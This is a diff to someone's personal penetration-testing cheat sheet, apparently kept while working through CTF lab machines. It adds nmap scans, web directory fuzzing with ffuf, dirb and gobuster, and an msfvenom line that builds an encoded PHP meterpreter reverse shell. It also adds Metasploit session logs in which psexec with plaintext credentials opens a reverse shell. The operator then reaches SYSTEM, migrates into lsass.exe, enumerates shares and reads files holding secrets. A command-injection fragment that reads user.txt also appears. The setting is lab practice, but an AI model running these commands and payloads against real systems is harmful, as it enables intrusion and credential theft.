@@ -120,7 +120,7 @@ nmap -sn 192.168.100.0/24 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort
 ## 🛠️ Ejemplo de uso escaneo agresivo de puertos con Nmap TCP
 
 ```bash
-sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.219.133 -oN scan.txt
+sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 10.201.71.91 -oN scan.txt
 ```
 
 ## 🛠️ Ejemplo de uso escaneo agresivo de puertos con Nmap UDP
@@ -193,7 +193,11 @@ grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
 
 
 ```bash
-nmap -p135,139,445,5000 -sV -sC -Pn -vvv 192.168.219.133 -oN fullScan.txt 
+nmap -p -sV -sC -Pn -vvv -n  ip -oN fullScan.txt 
+```
+
+```bash
+nmap -p139,3389,445,47001,49664,49665,49666,49667,49668,49670,49671,5985,8000,8080,8443 -sV -sC -Pn -vvv -n 10.201.71.91 -oN fullScan.txt 
 ```
 
 
@@ -359,6 +363,8 @@ msfvenom --list payloads | grep "linux/x64"
 msfvenom --list formats
 
 
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
 
 
 -F <Format>
@@ -607,19 +613,27 @@ grep -R " "
 
 
 
+dashboard/api/uploads/
+
 
 Using ffuf:
 
+
 ffuf
-user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.186.68/FUZZ
-Using dirb:
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.186.68/FUZZ
+
+
+ffuf -u 'http://storage.cloudsite.thm/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -mc 200,302,403 -t 50 -fc 404
+
+
 
 dirb
-user@machine$ dirb http://10.10.186.68/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+dirb http://10.10.186.68/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 Using Gobuster:
 
+
 gobuster
-user@machine$ gobuster dir --url http://10.10.186.68/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+gobuster dir --url http://10.10.186.68/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 Using the results from the commands above, please answer the below questions:
 
 
@@ -852,7 +866,8 @@ BitlockerActiveMonitoringLogs') ; type C:\Users\dev\Desktop\user.txt  ; dir ; #(
 curl http://10.10.186.68 -v
 
 
-user@machine$ curl http://10.10.186.68 -v
+
+curl http://10.10.186.68 -v
 *   Trying 10.10.186.68:80...
 * TCP_NODELAY set
 * Connected to 10.10.186.68 (10.10.186.68) port 80 (#0)
@@ -895,3 +910,128 @@ intitle:admin
 returns results that contain the specified word in the title
 
 More information about google hacking can be found here: https://en.wikipedia.org/wiki/Google_hacking
+
+
+
+
+
+
+
+
+getuid
+Server username: NT AUTHORITY\SYSTEM
+
+
+
+
+
+meterpreter > sysinfo
+Computer        : ACME-TEST
+OS              : Windows Server 2019 (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : FLASH
+Logged On Users : 8
+Meterpreter     : x86/windows
+meterpreter >
+
+
+
+
+
+
+
+# windows/gather/enum_shares
+
+
+meterpreter > shell
+
+C:\Windows\system32>net share
+net share
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share                     
+IPC$                                         Remote IPC                        
+ADMIN$       C:\Windows                      Remote Admin                      
+NETLOGON     C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
+                                             Logon server share                
+speedster    C:\Shares\speedster             
+SYSVOL       C:\Windows\SYSVOL\sysvol        Logon server share                
+The command completed successfully.
+
+
+C:\Windows\system32>
+
+
+
+
+meterpreter > ps
+
+
+756   636   lsass.exe    x64   0
+
+
+meterpreter > migrate 756
+[*] Migrating from 3332 to 756...
+[*] Migration completed successfully.
+meterpreter > 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+xploit completed, but no session was created.
+msf6 exploit(windows/smb/psexec) > unset all
+Unsetting datastore...
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.78.20
+RHOSTS => 10.10.78.20
+msf6 exploit(windows/smb/psexec) > set SMBUser ballen
+SMBUser => ballen
+msf6 exploit(windows/smb/psexec) > set SMBPass Password1
+SMBPass => Password1
+msf6 exploit(windows/smb/psexec) > run
+[*] Started reverse TCP handler on 10.10.95.179:4444 
+[*] 10.10.78.20:445 - Connecting to the server...
+[*] 10.10.78.20:445 - Authenticating to 10.10.78.20:445 as user 'ballen'...
+[-] 10.10.78.20:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: Unable to negotiate SMB1 with the remote host: Expecting SMB2 protocol with command=0, got SMB2 protocol with command=0, Status: (0xc002001c) RPC_NT_CALL_FAILED_DNE: The RPC failed and did not execute.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/psexec) > run
+[*] Started reverse TCP handler on 10.10.95.179:4444 
+[*] 10.10.78.20:445 - Connecting to the server...
+[*] 10.10.78.20:445 - Authenticating to 10.10.78.20:445 as user 'ballen'...
+[*] 10.10.78.20:445 - Selecting PowerShell target
+[*] 10.10.78.20:445 - Executing the payload...
+[+] 10.10.78.20:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (177734 bytes) to 10.10.78.20
+[*] Meterpreter session 4 opened (10.10.95.179:4444 -> 10.10.78.20:64665) at 2025-07-29 21:32:46 +0100
+
+meterpreter > search -f secrets.txt
+Found 1 result...
+=================
+
+Path                                                            Size (bytes)  Modified (UTC)
+----                                                            ------------  --------------
+c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 08:44:27 +0100
+
+meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
+My Twitter password is KDSvbsw3849!meterpreter > search -f realsecret.txt
+Found 1 result...
+=================
+
+Path                               Size (bytes)  Modified (UTC)
+----                               ------------  --------------
+c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100
+
+meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
+The Flash is the fastest man alivemeterpreter > 
